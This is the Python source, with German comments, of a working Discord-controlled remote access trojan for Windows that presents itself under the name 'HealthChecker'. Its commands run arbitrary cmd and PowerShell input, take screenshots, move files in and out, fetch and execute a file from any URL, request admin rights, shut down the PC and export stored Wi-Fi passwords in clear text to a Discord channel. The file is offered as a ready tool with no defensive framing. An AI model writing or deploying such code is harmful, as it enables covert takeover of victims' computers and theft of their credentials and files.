# Ersetzen Sie dies durch Ihr Bot-Token
TOKEN = 'YOUR_BOT_TOKEN'

GUILD_ID = YOUR_GUILD_ID

# Ersetzen Sie dies durch Ihre Discord-Benutzer-ID(s), die den Bot steuern dürfen
AUTHORIZED_USERS = [YOUR_USER_ID]

import discord
from discord.ext import commands
import platform
import subprocess
import os
import tempfile
import aiohttp
import aiofiles
import re
import shutil
import asyncio
from discord.ui import View, Button
from plyer import notification
import winreg
import ctypes
import sys
import time
import pyautogui
import chardet 
import glob
import uuid
import logging
import psutil
import datetime
import atexit

admin_status_file = "admin_status.txt"  # Füge diese Zeile hinzu, um die Variable zu definieren

# Dictionary to store the current process for each user
user_sessions = {}

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

current_paths = {}  # Speichert den aktuellen Pfad für jeden Benutzer
is_admin = False  # Variable zur Überprüfung der Admin-Rechte

SERVICE_NAME = "HealthChecker"
SCRIPT_PATH = os.path.abspath(sys.argv[0])
AUTOSTART_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
AUTOSTART_NAME = "HealthChecker"

def is_authorized(ctx):
    return ctx.author.id in AUTHORIZED_USERS

def sanitize_channel_name(name):
    return re.sub(r'[^a-z0-9-]', '-', name.lower())

def in_correct_channel(ctx):
    computer_name = platform.node()
    sanitized_name = sanitize_channel_name(computer_name)
    return ctx.channel.name == sanitized_name

async def send_temporary_message(ctx, content, duration=5):
    message = await ctx.send(content)
    await asyncio.sleep(duration)
    await message.delete()

async def log_message(ctx, content):
    await ctx.send(content)

def load_admin_status():
    global is_admin
    if os.path.exists(admin_status_file):
        with open(admin_status_file, 'r') as file:
            status = file.read()
            is_admin = status.lower() == 'true'

def check_if_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def elevate():
    try:
        # Prüfen, ob bereits Admin-Rechte vorhanden sind
        if check_if_admin():
            raise Exception("Der Prozess hat bereits Admin-Rechte.")

        script = os.path.abspath(sys.argv[0])
        script_ext = os.path.splitext(script)[1].lower()

        if script_ext == '.exe':
            # Falls die Datei eine .exe ist, direkt ausführen
            command = f'"{script}"'
        else:
            # Falls die Datei eine .py ist, Python-Interpreter verwenden
            command = f'"{sys.executable}" "{script}"'

        # Starte das Skript als Administrator neu über cmd, führe das Skript aus, warte 7 Sekunden und schließe dann das Fenster
        result = ctypes.windll.shell32.ShellExecuteW(None, "runas", "cmd.exe", f'/k {command} & timeout /t 7 & exit', None, 1)

        if result > 32:  # Erfolg
            return True  # Neustart erfolgreich initiiert
        else:
            raise Exception("Fehler beim Neustarten des Skripts mit Admin-Rechten.")
    except Exception as e:
        raise Exception(f"Fehler beim Anfordern von Admin-Rechten: {str(e)}")

async def log_message(ctx, message, duration=None):
    if duration:
        await ctx.send(message, delete_after=duration)
    else:
        await ctx.send(message)
        
def check_single_instance():
    # Verwende das temporäre Verzeichnis des Systems für die PID-Datei
    temp_dir = tempfile.gettempdir()
    pid_file = os.path.join(temp_dir, 'script_instance.pid')

    # Überprüfen, ob die PID-Datei existiert
    if os.path.exists(pid_file):
        with open(pid_file, 'r') as f:
            pid = int(f.read())
            # Überprüfen, ob der Prozess mit der gespeicherten PID noch läuft
            if psutil.pid_exists(pid):
                print("Eine Instanz des Skripts läuft bereits.")
                sys.exit(0)
            else:
                print("Gefundene PID-Datei, aber Prozess läuft nicht mehr. Überschreibe PID-Datei.")

    # Schreibe die aktuelle PID in die PID-Datei
    with open(pid_file, 'w') as f:
        f.write(str(os.getpid()))

    # Registriere eine Funktion, um die PID-Datei beim Beenden des Skripts zu entfernen
    def remove_pid_file():
        if os.path.exists(pid_file):
            os.remove(pid_file)
    
    atexit.register(remove_pid_file)
        
@bot.event
async def on_ready():
    print(f'Wir sind eingeloggt als {bot.user}')
    guild = bot.get_guild(GUILD_ID)
    if guild:
        computer_name = platform.node()
        sanitized_name = sanitize_channel_name(computer_name)
        existing_channel = discord.utils.get(guild.channels, name=sanitized_name)
        if not existing_channel:
            await guild.create_text_channel(sanitized_name)
            print(f'Channel "{sanitized_name}" wurde erstellt')
        else:
            print(f'Channel "{sanitized_name}" existiert bereits')
    else:
        print('Guild nicht gefunden')
    load_admin_status()  # Laden des Admin-Status beim Start
    
# Entfernen des Standard-help-Befehls
bot.remove_command('help')

# Ensure to use the bot instance instead of client
def is_bot_or_command(message):
    return (
        message.author == bot.user or
        message.content.startswith(bot.command_prefix)
    )
    
@bot.command(name='help')
async def custom_help(ctx):
    help_text = """
    **Verfügbare Befehle:**

    `!ping` - Zeigt die Latenz des Bots an.
    `!screenshot` - Macht einen Screenshot und sendet ihn.
    `!cmd <command>` - Führt einen CMD-Befehl aus.
    `!powershell <command>` - Führt einen PowerShell-Befehl aus.
    `!file_upload <target_path>` - Lädt eine Datei hoch.
    `!file_download <file_path>` - Lädt eine Datei herunter.
    `!execute <url>` - Lädt eine Datei von der URL herunter und führt sie aus.
    `!notify <title> <message>` - Sendet eine Benachrichtigung.
    `!restart` - Startet den PC neu.
    `!shutdown` - Fährt den PC herunter.
    `!admin` - Fordert Admin-Rechte an.
    `!stop` - Stoppt den Bot.
    `!wifi` - Zeigt WLAN-Profile und Passwörter an.
    `!system_info` - Zeigt Informationen über das System an.
    `!cpu_usage` - Zeigt die aktuelle CPU-Auslastung an.
    `!taskkill <pid>` - Beendet einen Prozess mit der angegebenen PID.
    """
    await ctx.send(help_text)
    
@bot.command()
@commands.check(is_authorized)
async def purge(ctx):
    if not in_correct_channel(ctx):
        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
        return

    try:
        deleted = await ctx.channel.purge(limit=200, check=is_bot_or_command)
        await log_message(ctx, f"{len(deleted)} Nachrichten gelöscht.", duration=5)
    except Exception as e:
        await log_message(ctx, f"Fehler beim Löschen von Bot-Nachrichten und Befehlen: {e}", duration=5)
    
@bot.command()
@commands.check(is_authorized)
async def ping(ctx):
    if not in_correct_channel(ctx):
        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
        return

    latency = round(bot.latency * 1000)
    await log_message(ctx, f"🏓 Pong! Latenz: {latency}ms")

@bot.command()
@commands.check(is_authorized)
async def screenshot(ctx):
    if not in_correct_channel(ctx):
        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
        return

    try:
        temp_dir = tempfile.gettempdir()
        screenshot_path = os.path.join(temp_dir, 'screenshot.png')
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)
        await ctx.send(file=discord.File(screenshot_path))
        await log_message(ctx, 'Screenshot erstellt und gesendet.')
        os.remove(screenshot_path)
    except Exception as e:
        await log_message(ctx, f'Fehler beim Erstellen des Screenshots: {str(e)}')
        
@bot.command()
@commands.check(is_authorized)
async def cmd(ctx, *, command):
    if not in_correct_channel(ctx):
        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
        return

    working_message = await ctx.send("🔄 Working...")
    try:
        # Run the command
        output = subprocess.run(command, shell=True, capture_output=True, text=True, encoding='utf-8', errors='ignore')

        await working_message.delete()

        # Helper function to split the output into 1990-character chunks
        def chunk_string(string, chunk_size=1990):  # 1990 leaves space for code block syntax
            return [string[i:i + chunk_size] for i in range(0, len(string), chunk_size)]

        # Combine stdout and stderr into a single output
        combined_output = ""
        if output.stdout:
            combined_output += f"Standard Output:\n{output.stdout}\n"
        if output.stderr:
            combined_output += f"Standard Error:\n{output.stderr}\n"

        # Split the combined output into chunks and send them
        output_chunks = chunk_string(combined_output)
        for chunk in output_chunks:
            await ctx.send(f"```{chunk}```")  # Send each chunk wrapped in a code block

        # Log the executed command
        await log_message(ctx, f"CMD-Befehl ausgeführt: {command}")

    except discord.errors.HTTPException as e:
        await log_message(ctx, f"Fehler bei der Ausführung des Befehls: {str(e)}")
    except Exception as e:
        await log_message(ctx, f"Fehler bei der Ausführung des Befehls: {str(e)}")
    finally:
        try:
            await working_message.delete()
        except discord.errors.NotFound:
            pass

@bot.command()
@commands.check(is_authorized)
async def powershell(ctx, *, command):
    if not in_correct_channel(ctx):
        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
        return

    working_message = await ctx.send("🔄 Working...")
    try:
        # Run the PowerShell command
        output = subprocess.run(['powershell', command], shell=True, capture_output=True, text=True, encoding='utf-8', errors='ignore')

        await working_message.delete()

        # Helper function to split the output into 1990-character chunks
        def chunk_string(string, chunk_size=1990):  # 1990 leaves space for code block syntax
            return [string[i:i + chunk_size] for i in range(0, len(string), chunk_size)]

        # Combine stdout and stderr into labeled sections
        combined_output = ""
        if output.stdout:
            combined_output += f"Standard Output:\n{output.stdout}\n"
        if output.stderr:
            combined_output += f"Standard Error:\n{output.stderr}\n"

        # Split combined output into chunks
        output_chunks = chunk_string(combined_output)

        # Send each chunk wrapped in a code block
        for chunk in output_chunks:
            await ctx.send(f"```{chunk}```")

        # Log successful execution
        await log_message(ctx, f'PowerShell-Befehl ausgeführt: {command}')

    except Exception as e:
        # Handle errors and clean up the working message
        try:
            await working_message.delete()
        except discord.errors.NotFound:
            pass
        await log_message(ctx, f'Fehler bei der Ausführung des Befehls: {str(e)}')

@bot.command()
@commands.check(is_authorized)
async def file_upload(ctx, target_path):
    if not in_correct_channel(ctx):
        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
        return

    working_message = await ctx.send("🔄 Working...")
    try:
        if ctx.message.attachments:
            for attachment in ctx.message.attachments:
                file_data = await attachment.read()
                async with aiofiles.open(target_path, 'wb') as f:
                    await f.write(file_data)
            await working_message.delete()
            await log_message(ctx, 'Datei(en) erfolgreich hochgeladen.')
        else:
            await working_message.delete()
            await log_message(ctx, 'Keine Dateien zum Hochladen gefunden.')
    except Exception as e:
        await working_message.delete()
        await log_message(ctx, f'Fehler beim Hochladen der Datei: {str(e)}')

@bot.command()
@commands.check(is_authorized)
async def file_download(ctx, file_path):
    if not in_correct_channel(ctx):
        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
        return

    working_message = await ctx.send("🔄 Working...")
    try:
        if os.path.exists(file_path):
            zip_path = None
            with tempfile.TemporaryDirectory() as temp_dir:
                if os.path.isdir(file_path):
                    zip_path = os.path.join(temp_dir, f'{os.path.basename(file_path)}.zip')
                    shutil.make_archive(zip_path.replace('.zip', ''), 'zip', file_path)
                    file_path = zip_path

                file_size = os.path.getsize(file_path)
                if file_size <= 8 * 1024 * 1024:  # 8MB
                    await ctx.send(file=discord.File(file_path))
                else:
                    await send_temporary_message(ctx, "Datei ist zu groß, um direkt gesendet zu werden.", duration=10)
                    part_number = 1
                    with open(file_path, 'rb') as f:
                        while chunk := f.read(8 * 1024 * 1024):
                            part_file_path = os.path.join(temp_dir, f'{os.path.basename(file_path)}_part{part_number}')
                            with open(part_file_path, 'wb') as part_file:
                                part_file.write(chunk)
                            await ctx.send(file=discord.File(part_file_path))
                            part_number += 1
            await log_message(ctx, 'Datei erfolgreich heruntergeladen.')
        else:
            await log_message(ctx, 'Datei nicht gefunden.')
        await working_message.delete()
    except Exception as e:
        await working_message.delete()
        await log_message(ctx, f'Fehler beim Herunterladen der Datei: {str(e)}')
        
@bot.command()
@commands.check(is_authorized)
async def execute(ctx, url):
    if not in_correct_channel(ctx):
        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
        return

    working_message = await ctx.send("🔄 Working...")
    try:
        filename = url.split('/')[-1]
        
        # Temporären Ordner erstellen
        temp_dir = tempfile.gettempdir()
        temp_filepath = os.path.join(temp_dir, filename)
        
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                if resp.status == 200:
                    async with aiofiles.open(temp_filepath, mode='wb') as f:
                        await f.write(await resp.read())
                    
                    # Start der Datei im temporären Ordner
                    if is_admin:
                        subprocess.Popen(temp_filepath, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE)
                    else:
                        subprocess.Popen(temp_filepath, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE)
                    
                    await working_message.delete()
                    await log_message(ctx, f'{filename} wurde heruntergeladen und in einem neuen Prozess gestartet.')
                else:
                    await working_message.delete()
                    await log_message(ctx, f'Fehler beim Herunterladen der Datei: {resp.status}')
    except Exception as e:
        await working_message.delete()
        await log_message(ctx, f'Fehler beim Herunterladen und Ausführen der Datei: {str(e)}')

@bot.command()
@commands.check(is_authorized)
async def system_info(ctx):
    if not in_correct_channel(ctx):
        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
        return

    try:
        uname = platform.uname()
        sys_info = f"""
        **System Information:**
        System: {uname.system}
        Node Name: {uname.node}
        Release: {uname.release}
        Version: {uname.version}
        Machine: {uname.machine}
        Processor: {uname.processor}
        """
        await ctx.send(sys_info)
        await log_message(ctx, 'Systeminformationen abgerufen.')
    except Exception as e:
        await log_message(ctx, f'Fehler beim Abrufen der Systeminformationen: {str(e)}')

@bot.command()
@commands.check(is_authorized)
async def tasklist(ctx):
    if not in_correct_channel(ctx):
        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
        return

    try:
        # Get a list of processes with PID and name
        processes = [(p.pid, p.info['name']) for p in psutil.process_iter(['name'])]
        process_list = "\n".join([f"PID: {pid}, Name: {name}" for pid, name in processes])

        # Helper function to split the process list into 1990-character chunks
        def chunk_string(string, chunk_size=1990):  # 1990 leaves space for code block syntax
            return [string[i:i + chunk_size] for i in range(0, len(string), chunk_size)]

        # Split process list into chunks
        process_list_chunks = chunk_string(process_list)

        # Send each chunk to Discord
        for chunk in process_list_chunks:
            await ctx.send(f"```\n{chunk}\n```")

        # Log the successful retrieval
        await log_message(ctx, 'Prozessliste abgerufen.')

    except Exception as e:
        await log_message(ctx, f'Fehler beim Abrufen der Prozessliste: {str(e)}')
        
@bot.command()
@commands.check(is_authorized)
async def taskkill(ctx, identifier: str):
    if not in_correct_channel(ctx):
        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
        return

    try:
        # Versuche, die Eingabe als PID zu interpretieren
        try:
            pid = int(identifier)
            process = psutil.Process(pid)
            process.terminate()
            await log_message(ctx, f'Prozess mit PID {pid} wurde beendet.')
        except ValueError:
            # Falls es keine gültige PID ist, versuche, einen Prozess nach Namen zu finden
            process_found = False
            identifier = identifier.lower()  # Vergleiche in Kleinbuchstaben

            for proc in psutil.process_iter(['pid', 'name']):
                proc_name = proc.info['name'].lower()
                # Überprüfe auch, ob der Prozessname die Eingabe enthält (z.B. "whatsapp.exe" für "WhatsApp")
                if identifier in proc_name:
                    proc.terminate()
                    await log_message(ctx, f'Prozess mit Namen {proc_name} (PID {proc.info["pid"]}) wurde beendet.')
                    process_found = True
                    break
            
            if not process_found:
                await log_message(ctx, f'Kein Prozess mit dem Namen {identifier} gefunden.')

    except Exception as e:
        await log_message(ctx, f'Fehler beim Beenden des Prozesses: {str(e)}')
        
@bot.command()
@commands.check(is_authorized)
async def notify(ctx, title, message):
    if not in_correct_channel(ctx):
        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
        return

    try:
        notification.notify(
            title=title,
            message=message,
            timeout=10
        )
        await log_message(ctx, f'Benachrichtigung gesendet: {title} - {message}')
    except Exception as e:
        await log_message(ctx, f'Fehler beim Senden der Benachrichtigung: {str(e)}')

@bot.command()
@commands.check(is_authorized)
async def restart(ctx):
    if not in_correct_channel(ctx):
        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
        return

    try:
        if is_admin:
            subprocess.run(['shutdown', '/r', '/t', '0'], shell=True)
        else:
            subprocess.run(['shutdown', '/r', '/t', '0'], shell=True)
        await log_message(ctx, 'Der PC wird neu gestartet.')
    except Exception as e:
        await log_message(ctx, f'Fehler beim Neustarten des PCs: {str(e)}')

@bot.command()
@commands.check(is_authorized)
async def shutdown(ctx):
    if not in_correct_channel(ctx):
        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
        return

    try:
        if is_admin:
            subprocess.run(['shutdown', '/s', '/t', '0'], shell=True)
        else:
            subprocess.run(['shutdown', '/s', '/t', '0'], shell=True)
        await log_message(ctx, 'Der PC wird heruntergefahren.')
    except Exception as e:
        await log_message(ctx, f'Fehler beim Herunterfahren des PCs: {str(e)}')

@bot.command()
@commands.check(is_authorized)
async def admin(ctx):
    global is_admin
    if not in_correct_channel(ctx):
        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
        return

    if check_if_admin():
        is_admin = True
        await log_message(ctx, 'Admin-Rechte bereits vorhanden.')
        return

    try:
        # Starte das Skript als Administrator neu
        if elevate():
            await log_message(ctx, 'Admin-Rechte wurden gewährt. Der alte Prozess wird nun beendet.')
            await asyncio.sleep(2)  # Gib Zeit für Logs
            os._exit(0)  # Beende den alten Prozess sauber
    except Exception as e:
        await log_message(ctx, f'Fehler beim Anfordern von Admin-Rechten: {str(e)}')

@bot.command()
@commands.check(is_authorized)
async def stop(ctx):
    if not in_correct_channel(ctx):
        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
        return

    await log_message(ctx, 'Bot wird gestoppt.')
    await bot.close()
    
@bot.command()
@commands.check(is_authorized)
async def wifi(ctx):
    if not in_correct_channel(ctx):
        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
        return

    working_message = await ctx.send("🔄 Working...")
    try:
        # Erstelle ein temporäres Verzeichnis im temp-Ordner
        export_dir = os.path.join(tempfile.gettempdir(), 'SomeStuff')

        # Sicherstellen, dass das Exportverzeichnis existiert
        if not os.path.exists(export_dir):
            os.makedirs(export_dir)

        # WLAN-Profile exportieren (inkl. Schlüssel) ohne Konsolenfenster
        subprocess.run(
            ["netsh", "wlan", "export", "profile", "key=clear", f"folder={export_dir}"], 
            check=True, 
            creationflags=subprocess.CREATE_NO_WINDOW
        )

        # Alle exportierten XML-Dateien lesen
        xml_files = glob.glob(os.path.join(export_dir, "*.xml"))
        if not xml_files:
            await working_message.delete()
            await send_temporary_message(ctx, "Keine exportierten WLAN-Profile gefunden.", duration=10)
            return

        # Sende die XML-Dateien an den Discord-Channel
        for xml_file in xml_files:
            with open(xml_file, 'rb') as f:
                await ctx.send(file=discord.File(f, filename=os.path.basename(xml_file)))

        await working_message.delete()
        await send_temporary_message(ctx, "WLAN-Profile erfolgreich exportiert und gesendet.", duration=10)

    except Exception as e:
        await working_message.delete()
        await send_temporary_message(ctx, f'Fehler beim Abrufen der WLAN-Profile: {str(e)}', duration=10)
        
def main():
    time.sleep(15)
    load_admin_status()
    check_single_instance()

if __name__ == "__main__":
    main()

bot.run(TOKEN)